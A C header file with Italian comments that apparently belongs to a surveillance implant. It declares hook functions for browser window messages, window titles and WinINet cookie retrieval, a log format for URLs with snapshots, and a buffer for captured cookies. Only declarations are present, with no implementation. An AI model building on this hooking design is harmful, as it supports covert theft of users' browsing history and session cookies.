#pragma once


// XXX Additional data per i log di tipo URL con snapshot
typedef struct _UrlSnapAdditionalData {
	UINT uVersion;
#define LOG_URLSNAP_VERSION 2010071301
	UINT uBrowserType;
	UINT uUrlNameLen;
	UINT uWindowTitleLen;
} UrlSnapAdditionalData;

typedef struct _url_info_struct {
	UINT uBrowserType;
	WCHAR url_name[1];
} url_info_struct;

DWORD PM_SendMessageURL_setup(HMServiceStruct* pData);

BOOL WINAPI PM_SetWindowText(HWND hWnd,
	BYTE* text);
DWORD PM_SetWindowText_setup(HMServiceStruct* pData);

LRESULT WINAPI PM_SendMessageURL(HWND hWnd,
	UINT Msg,
	WPARAM wParam,
	LPARAM lParam);


typedef BOOL(WINAPI* IsWindow_t) (HWND);
typedef struct {
	COMMONDATA;
	IsWindow_t pIsWindow;
#define BROWSER_UNKNOWN      0x00000000
#define BROWSER_IE           0x00000001
#define BROWSER_MOZILLA      0x00000002
#define BROWSER_OPERA		 0x00000003
#define BROWSER_CHROME		 0x00000005
#define BROWSER_TYPE_MASK    0x3FFFFFFF
#define BROWSER_SETTITLE     0x80000000
	DWORD browser_type;
} SendMessageURLStruct;
extern SendMessageURLStruct SendMessageURLData;

BOOL WINAPI PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, LPCWSTR lpszCookieData, LPDWORD lpdwSize, DWORD dwFlags, DWORD_PTR dwReserved);
DWORD PM_InternetGetCookieEx_setup(HMServiceStruct* pData);

typedef WCHAR* (WINAPI* StrStrW_t) (WCHAR*, WCHAR*);
#define MAX_COOKIE_SIZE 2048
typedef struct {
	COMMONDATA;
	WCHAR local_cookie[MAX_COOKIE_SIZE];
	StrStrW_t pStrStrW;
} InternetGetCookieExStruct;
extern InternetGetCookieExStruct InternetGetCookieExData;